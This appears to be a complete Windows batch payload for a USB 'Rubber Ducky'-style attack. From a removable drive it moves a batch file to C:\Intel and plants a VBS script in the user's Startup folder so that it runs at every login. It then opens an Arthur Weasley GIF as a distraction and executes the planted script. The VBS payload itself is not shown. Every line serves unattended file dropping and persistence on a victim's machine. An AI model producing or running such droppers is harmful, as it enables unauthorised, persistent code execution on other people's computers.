@ECHO OFF
cd %TEMP%
powershell -command move-item -path D:\README\RubberDucky.bat -destination C:\Intel
powershell -command sleep 5
powershell -command move-item -path D:\README\ShadowDucky.vbs -destination C:\$env:HOMEPATH\AppData\Roaming\Microsoft\Windows\'Start Menu'\Programs\Startup
powershell -command sleep 5
powershell -command Start-Process "https://media.tenor.com/JzhAhUybd3wAAAAC/arthur-weasley.gif"
powershell -command sleep 5
powershell -command Start-Process C:\$env:HOMEPATH\AppData\Roaming\Microsoft\Windows\'Start Menu'\Programs\Startup\ShadowDucky.vbs
PAUSE